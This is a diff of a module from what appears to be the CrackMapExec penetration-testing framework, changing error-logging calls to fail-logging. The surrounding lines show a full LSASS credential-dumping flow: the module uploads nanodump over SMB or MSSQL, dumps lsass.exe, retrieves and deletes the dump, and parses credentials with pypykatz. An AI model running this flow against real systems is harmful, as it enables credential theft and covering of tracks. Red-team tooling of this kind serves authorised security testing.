@@ -87,7 +87,7 @@ class CMEModule:
                 elif context.protocol == 'mssql':
                     nano.write(self.nano_embedded64)
                 else:
-                    context.log.error('Unsupported Windows architecture')
+                    context.log.fail('Unsupported Windows architecture')
                     sys.exit(1)
     
         if context.protocol == 'smb':
@@ -96,7 +96,7 @@ class CMEModule:
                     connection.conn.putFile(self.share, self.tmp_share + self.nano, nano.read)
                     context.log.success(f"Created file {self.nano} on the \\\\{self.share}{self.tmp_share}")
                 except Exception as e:
-                    context.log.error(f"Error writing file to share {self.share}: {e}")
+                    context.log.fail(f"Error writing file to share {self.share}: {e}")
         else:
             with open(self.nano_path + self.nano, 'rb') as nano:
                 try:
@@ -106,10 +106,10 @@ class CMEModule:
                     if exec_method.file_exists(self.tmp_dir + self.nano):
                         context.log.success(f"Created file {self.nano} on the remote machine {self.tmp_dir}")
                     else:
-                        context.log.error("File does not exist on the remote system... error during upload")
+                        context.log.fail("File does not exist on the remote system... error during upload")
                         sys.exit(1)
                 except Exception as e:
-                    context.log.error(f"Error writing file to remote machine directory {self.tmp_dir}: {e}")
+                    context.log.fail(f"Error writing file to remote machine directory {self.tmp_dir}: {e}")
     
         # get pid lsass
         command = 'tasklist /v /fo csv | findstr /i "lsass"'
@@ -127,7 +127,7 @@ class CMEModule:
             context.log.success('Process lsass.exe was successfully dumped')
             dump = True
         else:
-            context.log.error('Process lsass.exe error on dump, try with verbose')
+            context.log.fail('Process lsass.exe error on dump, try with verbose')
         
         if dump:
             context.log.display(f"Copying {nano_log_name} to host")
@@ -138,38 +138,38 @@ class CMEModule:
                         connection.conn.getFile(self.share, self.tmp_share + nano_log_name, dump_file.write)
                         context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                     except Exception as e:
-                        context.log.error(f"Error while getting file: {e}")
+                        context.log.fail(f"Error while getting file: {e}")
 
                 try:
                     connection.conn.deleteFile(self.share, self.tmp_share + self.nano)
                     context.log.success(f"Deleted nano file on the {self.share} share")
                 except Exception as e:
-                    context.log.error(f"Error deleting nano file on share {self.share}: {e}")
+                    context.log.fail(f"Error deleting nano file on share {self.share}: {e}")
 
                 try:
                     connection.conn.deleteFile(self.share, self.tmp_share + nano_log_name)
                     context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
                 except Exception as e:
-                    context.log.error(f"Error deleting lsass.dmp file on share {self.share}: {e}")
+                    context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
             else:
                 try:
                     exec_method = MSSQLEXEC(connection.conn)
                     exec_method.get_file(self.tmp_dir + nano_log_name, filename)
                     context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                 except Exception as e:
-                    context.log.error(f"Error while getting file: {e}")
+                    context.log.fail(f"Error while getting file: {e}")
 
                 try:
                     connection.execute(f"del {self.tmp_dir + self.nano}")
                     context.log.success(f"Deleted nano file on the {self.share} dir")
                 except Exception as e:
-                    context.log.error(f"Error deleting nano file on dir {self.tmp_dir}: {e}")
+                    context.log.fail(f"Error deleting nano file on dir {self.tmp_dir}: {e}")
 
                 try:
                     connection.execute(f"del {self.tmp_dir + nano_log_name}")
                     context.log.success(f"Deleted lsass.dmp file on the {self.tmp_dir} dir")
                 except Exception as e:
-                    context.log.error(f"Error deleting lsass.dmp file on dir {self.tmp_dir}: {e}")
+                    context.log.fail(f"Error deleting lsass.dmp file on dir {self.tmp_dir}: {e}")
 
             fh = open(filename, "r+b")
             fh.seek(0)
@@ -187,7 +187,7 @@ class CMEModule:
                         pypy_parse = pypykatz.parse_minidump_external(dump)
                     except Exception as e:
                         pypy_parse = None
-                        context.log.error(f'Error parsing minidump: {e}')
+                        context.log.fail(f'Error parsing minidump: {e}')
 
                     ssps = [
                         'msv_creds',
@@ -230,4 +230,4 @@ class CMEModule:
                     if len(bh_creds) > 0:
                         add_user_bh(bh_creds, None, context.log, connection.config)
                 except Exception as e:
-                    context.log.error(f"Error opening dump file: {e}")
+                    context.log.fail(f"Error opening dump file: {e}")
